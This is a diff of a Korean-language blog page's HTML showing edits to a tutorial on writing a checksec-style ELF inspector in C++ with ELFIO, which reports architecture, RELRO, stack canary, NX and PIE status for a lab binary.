+        <span class="p">{</span> <span class="n">EM_CE</span><span class="p">,</span> <span class="s">"Freescale Communication Engine RISC core"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_M32C</span><span class="p">,</span> <span class="s">"Renesas M32C series microprocessors"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res121</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res122</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res123</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res124</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res125</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res126</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res127</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res128</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res129</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res130</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_TSK3000</span><span class="p">,</span> <span class="s">"Altium TSK3000 core"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_RS08</span><span class="p">,</span> <span class="s">"Freescale RS08 embedded processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res133</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ECOG2</span><span class="p">,</span> <span class="s">"Cyan Technology eCOG2 microprocessor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SCORE</span><span class="p">,</span> <span class="s">"Sunplus Score"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SCORE7</span><span class="p">,</span> <span class="s">"Sunplus S+core7 RISC processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_DSP24</span><span class="p">,</span> <span class="s">"New Japan Radio (NJR) 24-bit DSP Processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_VIDEOCORE3</span><span class="p">,</span> <span class="s">"Broadcom VideoCore III processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_LATTICEMICO32</span><span class="p">,</span> <span class="s">"RISC processor for Lattice FPGA architecture"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SE_C17</span><span class="p">,</span> <span class="s">"Seiko Epson C17 family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_TI_C6000</span><span class="p">,</span> <span class="s">"Texas Instruments TMS320C6000 DSP family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_TI_C2000</span><span class="p">,</span> <span class="s">"Texas Instruments TMS320C2000 DSP family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_TI_C5500</span><span class="p">,</span> <span class="s">"Texas Instruments TMS320C55x DSP family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res143</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res144</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res145</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res146</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res147</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res148</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res149</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res150</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res151</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res152</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res153</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res154</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res155</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res156</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res157</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res158</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res159</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MMDSP_PLUS</span><span class="p">,</span> <span class="s">"STMicroelectronics 64bit VLIW Data Signal Processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_CYPRESS_M8C</span><span class="p">,</span> <span class="s">"Cypress M8C microprocessor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_R32C</span><span class="p">,</span> <span class="s">"Renesas R32C series microprocessors"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_TRIMEDIA</span><span class="p">,</span> <span class="s">"NXP Semiconductors TriMedia architecture family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_QDSP6</span><span class="p">,</span> <span class="s">"QUALCOMM DSP6 Processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_8051</span><span class="p">,</span> <span class="s">"Intel 8051 and variants"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_STXP7X</span><span class="p">,</span> <span class="s">"STMicroelectronics STxP7x family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_NDS32</span><span class="p">,</span>
+        <span class="s">"Andes Technology compact code size embedded RISC processor family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ECOG1</span><span class="p">,</span> <span class="s">"Cyan Technology eCOG1X family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ECOG1X</span><span class="p">,</span> <span class="s">"Cyan Technology eCOG1X family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MAXQ30</span><span class="p">,</span> <span class="s">"Dallas Semiconductor MAXQ30 Core Micro-controllers"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_XIMO16</span><span class="p">,</span> <span class="s">"New Japan Radio (NJR) 16-bit DSP Processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MANIK</span><span class="p">,</span> <span class="s">"M2000 Reconfigurable RISC Microprocessor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_CRAYNV2</span><span class="p">,</span> <span class="s">"Cray Inc. NV2 vector architecture"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_RX</span><span class="p">,</span> <span class="s">"Renesas RX family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_METAG</span><span class="p">,</span> <span class="s">"Imagination Technologies META processor architecture"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MCST_ELBRUS</span><span class="p">,</span> <span class="s">"MCST Elbrus general purpose hardware architecture"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ECOG16</span><span class="p">,</span> <span class="s">"Cyan Technology eCOG16 family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_CR16</span><span class="p">,</span> <span class="s">"National Semiconductor CompactRISC 16-bit processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ETPU</span><span class="p">,</span> <span class="s">"Freescale Extended Time Processing Unit"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SLE9X</span><span class="p">,</span> <span class="s">"Infineon Technologies SLE9X core"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_L1OM</span><span class="p">,</span> <span class="s">"Intel L1OM"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_INTEL181</span><span class="p">,</span> <span class="s">"Reserved by Intel"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_INTEL182</span><span class="p">,</span> <span class="s">"Reserved by Intel"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res183</span><span class="p">,</span> <span class="s">"Reserved by ARM"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res184</span><span class="p">,</span> <span class="s">"Reserved by ARM"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_AVR32</span><span class="p">,</span> <span class="s">"Atmel Corporation 32-bit microprocessor family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_STM8</span><span class="p">,</span> <span class="s">"STMicroeletronics STM8 8-bit microcontroller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_TILE64</span><span class="p">,</span> <span class="s">"Tilera TILE64 multicore architecture family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_TILEPRO</span><span class="p">,</span> <span class="s">"Tilera TILEPro multicore architecture family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MICROBLAZE</span><span class="p">,</span> <span class="s">"Xilinx MicroBlaze 32-bit RISC soft processor core"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_CUDA</span><span class="p">,</span> <span class="s">"NVIDIA CUDA architecture "</span> <span class="p">}</span>
+    <span class="p">};</span>
 </code></pre></div></div>
-<p>위에서 key에 해당하는 값들은 모두 elf_type.hpp에 정의되어 있는 값이다.
-<br />
-이제 위에서 구현한 map과 더불어 get_machine() 함수를 특정 문자열과 매칭시켜 아래와 같이 출력할 수 있다.</p>
+<p><br />
+위에서 key에 해당하는 값들은 모두 elf_type.hpp에 정의되어 있는 값이다. 이제 구현한 map과 더불어 get_machine() 함수를 특정 문자열과 매칭시켜 아래와 같이 출력할 수 있다.</p>
 
 <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">machines</span><span class="p">[</span><span class="n">reader</span><span class="p">.</span><span class="n">get_machine</span><span class="p">()]</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </code></pre></div></div>
@@ -443,10 +629,7 @@ architecture 정보 역시 EFLIO의 get_class() 함수를 사용하여 쉽게 �
 </code></pre></div></div>
 
 <p><br />
-아래는 위의 내용들을 종합하여 ELFIO로 실행파일 로딩 시 Arch 정보까지만 출력하는 코드 및 실행 결과이다. 지면 관계상 machines의 일부분은 생략하였고, 완전한 코드는 아래 첨부해 놓았다.</p>
-
-<p><a href="LAB4%20533e97ab692847c2abc2fb31005fb8f8/main.cpp">main.cpp</a>
-<br /></p>
+아래는 위의 내용들을 종합하여 ELFIO로 실행파일 로딩 시 Arch 정보까지만 출력하는 코드 및 실행 결과이다. 지면 관계상 machines의 일부분은 생략하였다.</p>
 
 <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;iostream&gt;
 #include &lt;mutex&gt;
@@ -459,7 +642,6 @@ architecture 정보 역시 EFLIO의 get_class() 함수를 사용하여 쉽게 �
 #include &lt;boost/format.hpp&gt;
 </span>
 <span class="cp">#include "elfio/elfio.hpp"
-#include &lt;elfio/elfio_dump.hpp&gt;
 #include &lt;elfio/elf_types.hpp&gt;
 </span>
 <span class="k">class</span> <span class="nc">ELF</span>
@@ -614,7 +796,8 @@ architecture 정보 역시 EFLIO의 get_class() 함수를 사용하여 쉽게 �
 </span></code></pre></div></div>
 
 <p><br />
-다음으로 Dynamic Section에서 BIND_NOW flag가 있는지 확인을 해야한다. ELFIO에서 Dynamic section을 탐색하면서 BIND_NOW flag를 체크하려면 dynamic_section_accessor 클래스로 Dynamic Section에 접근한 다음, get_entry() 함수를 호출하여 반환된 tag 정보를 확인하면 된다. 아래는 BIND_NOW를 체크하는 코드이다.</p>
+다음으로 Dynamic Section에서 BIND_NOW flag가 있는지 확인을 해야한다. ELFIO에서 Dynamic section을 탐색하면서 BIND_NOW flag를 체크하려면 dynamic_section_accessor 클래스로 Dynamic Section에 접근한 다음, get_entry() 함수를 호출하여 반환된 tag 정보를 확인하면 된다.
+<br />아래는 BIND_NOW를 체크하는 코드이다.</p>
 
 <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
 <span class="p">{</span>
@@ -640,8 +823,6 @@ architecture 정보 역시 EFLIO의 get_class() 함수를 사용하여 쉽게 �
 <p><br />
 이제 지금까지 확인된 사항들을 모두 결합하여 RELRO 정보를 출력해보자. 아래는 현재까지 확인된 사항들을 모두 결합하여 RELRO 정보까지 출력하는 코드 및 실행 결과이다.</p>
 
-<p><a href="LAB4%20533e97ab692847c2abc2fb31005fb8f8/main%201.cpp">main.cpp</a></p>
-
 <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;iostream&gt;
 #include &lt;mutex&gt;
 </span>
@@ -653,7 +834,6 @@ architecture 정보 역시 EFLIO의 get_class() 함수를 사용하여 쉽게 �
 #include &lt;boost/format.hpp&gt;
 </span>
 <span class="cp">#include "elfio/elfio.hpp"
-#include &lt;elfio/elfio_dump.hpp&gt;
 #include &lt;elfio/elf_types.hpp&gt;
 </span>
 <span class="k">class</span> <span class="nc">ELF</span>
@@ -754,16 +934,14 @@ architecture 정보 역시 EFLIO의 get_class() 함수를 사용하여 쉽게 �
 <p><br /></p>
 <h2 id="stack"><strong>STACK</strong></h2>
 
-<p>stack canary 체크를 위해 symbol 정보에서 “__stack_chk_fail” 가 있는지 여부를 확인한다.
-<br />
-symbol 정보를 확인하기 위해서는 dynamic section을 탐색하는 것과 비슷하게, ELFIO에서 지원하는  symbol_section_accessor를 아래와 같이 이용할 수 있다.</p>
+<p>stack canary 체크를 위해서는 symbol 정보에서 “__stack_chk_fail” 가 존재하는지 여부를 확인하면 된다. symbol 정보를 확인하기 위해 symbol_section_accessor를 아래와 같이 이용할 수 있다.</p>
 
 <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ELFIO</span><span class="o">::</span><span class="n">section</span><span class="o">*</span> <span class="n">sec</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
 <span class="n">ELFIO</span><span class="o">::</span><span class="n">symbol_section_accessor</span> <span class="nf">symbol</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span> <span class="n">sec</span><span class="p">);</span>
 </code></pre></div></div>
 
 <p><br />
-아래는 symbol을 수집하는 get_symbols() 코드이다.</p>
+아래는 symbol을 수집하는 get_symbols() 코드이다. 수집된 symbol 정보들은 std::unordered_map&lt;std::string, ELFIO::Elf64_Addr&gt; symbols에 저장된다.</p>
 
 <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">get_symbols</span><span class="p">()</span>
 <span class="p">{</span>
@@ -821,7 +999,6 @@ symbol_section_accessor를 이용해 symbol을 수집한 후, “__stack_chk_fai
 #include &lt;boost/format.hpp&gt;
 </span>
 <span class="cp">#include "elfio/elfio.hpp"
-#include &lt;elfio/elfio_dump.hpp&gt;
 #include &lt;elfio/elf_types.hpp&gt;
 </span>
 <span class="k">class</span> <span class="nc">ELF</span>
@@ -957,7 +1134,6 @@ symbol_section_accessor를 이용해 symbol을 수집한 후, “__stack_chk_fai
     <span class="k">try</span>
     <span class="p">{</span>
         <span class="n">ELF</span> <span class="n">e</span><span class="p">{</span><span class="s">"/tmp/hitcon/LAB/lab4/ret2lib"</span><span class="p">};</span>
-        <span class="c1">// ELF e{"/usr/sbin/chroot"};</span>
     <span class="p">}</span>
     <span class="k">catch</span> <span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">exception</span><span class="o">&amp;</span> <span class="n">e</span><span class="p">)</span>
     <span class="p">{</span>
@@ -973,8 +1149,7 @@ symbol_section_accessor를 이용해 symbol을 수집한 후, “__stack_chk_fai
 <p><br /></p>
 <h2 id="nx"><strong>NX</strong></h2>
 
-<p>NX bit의 활성화 여부는 segment들 중 GNU_STACK 형식의 Flag를 보고 알 수 있다. 만약 Flag의 permission이 RWX가 아닐 경우 NX bit가 활성화된 것이다.
-코드는 아래와 같다.</p>
+<p>NX bit의 활성화 여부는 segment들 중 GNU_STACK 형식의 Flag를 보고 알 수 있다. 만약 Flag의 permission이 RWX가 아닐 경우 NX bit가 활성화된 것이다.</p>
 
 <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="nf">get_nx</span><span class="p">()</span>
 <span class="p">{</span>
@@ -994,8 +1169,6 @@ symbol_section_accessor를 이용해 symbol을 수집한 후, “__stack_chk_fai
 
 <p><br />
 이제 NX 결과까지 출력해보자. 아래는 main 함수에서 출력을 추가하고 함수 get_nx()를 추가한 코드 및 그 실행 결과이다.</p>
-
-<p><a href="LAB4%20533e97ab692847c2abc2fb31005fb8f8/main%202.cpp">main.cpp</a></p>
 
 <p><img src="/assets/images/nx.png" alt="full" /></p>
 
@@ -1062,97 +1235,10 @@ Dynamic Section을 탐색하는 것은 이전 Relro에서 사용한 방법과 �
 </code></pre></div></div>
 
 <p><br />
-아래는 지금까지 구현된 모든 코드들과 그 실행 결과이다.</p>
-
-<p><a href="LAB4%20533e97ab692847c2abc2fb31005fb8f8/main%203.cpp">main.cpp</a></p>
+아래는 지금까지 구현된 모든 코드들을 실행한 결과이다.</p>
 
 <p><img src="/assets/images/pie.png" alt="full" /></p>
 
-<p><br />
-추가된 get_entry() 함수 및 연관된 함수들의 코드는 아래와 같다.</p>
-
-<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">bool</span> <span class="nf">get_entry</span><span class="p">(</span> <span class="n">Elf_Xword</span>   <span class="n">index</span><span class="p">,</span>
-                <span class="n">Elf64_Addr</span><span class="o">&amp;</span> <span class="n">offset</span><span class="p">,</span>
-                <span class="n">Elf_Xword</span><span class="o">&amp;</span>  <span class="n">info</span><span class="p">,</span>
-                <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">symbol</span><span class="p">,</span>
-                <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">type</span><span class="p">,</span>
-                <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">symbolName</span><span class="p">)</span> <span class="k">const</span>
-<span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span> <span class="n">index</span> <span class="o">&gt;=</span> <span class="n">get_entries_num</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span> <span class="c1">// Is index valid</span>
-        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="c1">// get symbol by index</span>
-    <span class="n">Elf_Sxword</span>  <span class="n">addend</span><span class="p">;</span>
-    <span class="n">get_entry</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">symbol</span><span class="p">,</span> <span class="n">type</span><span class="p">,</span> <span class="n">addend</span><span class="p">);</span>
-
-    <span class="c1">// get symbol name</span>
-    <span class="n">symbol_section_accessor</span> <span class="nf">symbols</span><span class="p">(</span><span class="n">elf_file</span><span class="p">,</span> <span class="n">elf_file</span><span class="p">.</span><span class="n">sections</span><span class="p">[</span><span class="n">get_symbol_table_index</span><span class="p">()]);</span>
-
-    <span class="n">Elf64_Addr</span>  <span class="n">symbolValue</span><span class="p">;</span>
-    <span class="n">Elf_Xword</span>     <span class="n">size</span><span class="p">;</span>
-    <span class="n">Elf_Half</span>      <span class="n">section</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bind</span><span class="p">,</span> <span class="n">symbolType</span><span class="p">,</span> <span class="n">other</span><span class="p">;</span>
-    <span class="n">symbols</span><span class="p">.</span><span class="n">get_symbol</span><span class="p">(</span><span class="n">symbol</span><span class="p">,</span> <span class="n">symbolName</span><span class="p">,</span> <span class="n">symbolValue</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">bind</span><span class="p">,</span> <span class="n">symbolType</span><span class="p">,</span> <span class="n">section</span><span class="p">,</span> <span class="n">other</span><span class="p">);</span>
-
-    <span class="k">if</span> <span class="p">(</span> <span class="n">elf_file</span><span class="p">.</span><span class="n">get_class</span><span class="p">()</span> <span class="o">==</span> <span class="n">ELFCLASS32</span> <span class="p">)</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span> <span class="n">SHT_REL</span> <span class="o">==</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
-            <span class="n">generic_get_entry_rel</span><span class="o">&lt;</span><span class="n">Elf32_Rel</span><span class="o">&gt;</span><span class="p">(</span> <span class="n">index</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="n">symbol</span><span class="p">,</span> <span class="n">type</span> <span class="p">);</span>
-        <span class="p">}</span>
-        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">SHT_RELA</span> <span class="o">==</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
-            <span class="n">generic_get_entry_rela</span><span class="o">&lt;</span><span class="n">Elf32_Rela</span><span class="o">&gt;</span><span class="p">(</span> <span class="n">index</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="n">symbol</span><span class="p">,</span> <span class="n">type</span> <span class="p">);</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="k">else</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span> <span class="n">SHT_REL</span> <span class="o">==</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
-            <span class="n">generic_get_entry_rel</span><span class="o">&lt;</span><span class="n">Elf64_Rel</span><span class="o">&gt;</span><span class="p">(</span> <span class="n">index</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="n">symbol</span><span class="p">,</span> <span class="n">type</span> <span class="p">);</span>
-        <span class="p">}</span>
-        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">SHT_RELA</span> <span class="o">==</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
-            <span class="n">generic_get_entry_rela</span><span class="o">&lt;</span><span class="n">Elf64_Rela</span><span class="o">&gt;</span><span class="p">(</span> <span class="n">index</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="n">symbol</span><span class="p">,</span> <span class="n">type</span> <span class="p">);</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-
-    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
-<span class="err">}</span>
-</code></pre></div></div>
-
-<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">template</span> <span class="o">&lt;</span><span class="k">class</span> <span class="nc">T</span><span class="p">&gt;</span>
-<span class="kt">void</span> <span class="nf">generic_get_entry_rel</span><span class="p">(</span> <span class="n">Elf_Xword</span>   <span class="n">index</span><span class="p">,</span>
-                            <span class="n">Elf64_Addr</span><span class="o">&amp;</span> <span class="n">offset</span><span class="p">,</span>
-                            <span class="n">Elf_Xword</span><span class="o">&amp;</span>   <span class="n">info</span><span class="p">,</span>
-                            <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">symbol</span><span class="p">,</span>
-                            <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">type</span> <span class="p">)</span> <span class="k">const</span>
-<span class="p">{</span>
-    <span class="k">const</span> <span class="n">endianess_convertor</span><span class="o">&amp;</span> <span class="n">convertor</span> <span class="o">=</span> <span class="n">elf_file</span><span class="p">.</span><span class="n">get_convertor</span><span class="p">();</span>
-
-    <span class="k">const</span> <span class="n">T</span><span class="o">*</span> <span class="n">pEntry</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="k">const</span> <span class="n">T</span><span class="o">*&gt;</span><span class="p">(</span>
-        <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_data</span><span class="p">()</span> <span class="o">+</span>
-        <span class="n">index</span> <span class="o">*</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_entry_size</span><span class="p">()</span> <span class="p">);</span>
-    <span class="n">offset</span>        <span class="o">=</span> <span class="n">convertor</span><span class="p">(</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">r_offset</span> <span class="p">);</span>
-    <span class="n">info</span>          <span class="o">=</span> <span class="n">convertor</span><span class="p">(</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">r_info</span> <span class="p">);</span>
-    <span class="n">Elf_Xword</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">convertor</span><span class="p">(</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">r_info</span> <span class="p">);</span>
-    <span class="n">symbol</span>        <span class="o">=</span> <span class="n">get_sym_and_type</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;::</span><span class="n">get_r_sym</span><span class="p">(</span> <span class="n">tmp</span> <span class="p">);</span>
-    <span class="n">type</span>          <span class="o">=</span> <span class="n">get_sym_and_type</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;::</span><span class="n">get_r_type</span><span class="p">(</span> <span class="n">tmp</span> <span class="p">);</span>
-<span class="err">}</span>
-
-<span class="k">template</span> <span class="o">&lt;</span><span class="k">class</span> <span class="nc">T</span><span class="p">&gt;</span>
-<span class="kt">void</span> <span class="nf">generic_get_entry_rela</span><span class="p">(</span> <span class="n">Elf_Xword</span>   <span class="n">index</span><span class="p">,</span>
-                             <span class="n">Elf64_Addr</span><span class="o">&amp;</span> <span class="n">offset</span><span class="p">,</span>
-                             <span class="n">Elf_Xword</span><span class="o">&amp;</span>   <span class="n">info</span><span class="p">,</span>
-                             <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">symbol</span><span class="p">,</span>
-                             <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">type</span> <span class="p">)</span> <span class="k">const</span>
-<span class="p">{</span>
-    <span class="k">const</span> <span class="n">endianess_convertor</span><span class="o">&amp;</span> <span class="n">convertor</span> <span class="o">=</span> <span class="n">elf_file</span><span class="p">.</span><span class="n">get_convertor</span><span class="p">();</span>
-
-    <span class="k">const</span> <span class="n">T</span><span class="o">*</span> <span class="n">pEntry</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="k">const</span> <span class="n">T</span><span class="o">*&gt;</span><span class="p">(</span>
-        <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_data</span><span class="p">()</span> <span class="o">+</span>
-        <span class="n">index</span> <span class="o">*</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_entry_size</span><span class="p">()</span> <span class="p">);</span>
-    <span class="n">offset</span>        <span class="o">=</span> <span class="n">convertor</span><span class="p">(</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">r_offset</span> <span class="p">);</span>
-    <span class="n">info</span>          <span class="o">=</span> <span class="n">convertor</span><span class="p">(</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">r_info</span> <span class="p">);</span>
-    <span class="n">symbol</span>        <span class="o">=</span> <span class="n">get_sym_and_type</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;::</span><span class="n">get_r_sym</span><span class="p">(</span> <span class="n">info</span> <span class="p">);</span>
-    <span class="n">type</span>          <span class="o">=</span> <span class="n">get_sym_and_type</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;::</span><span class="n">get_r_type</span><span class="p">(</span> <span class="n">info</span> <span class="p">);</span>
-<span class="err">}</span>
-</code></pre></div></div>
 
         
       </section>
@@ -1237,8 +1323,8 @@ Dynamic Section을 탐색하는 것은 이전 Relro에서 사용한 방법과 �
   </p>
 
 
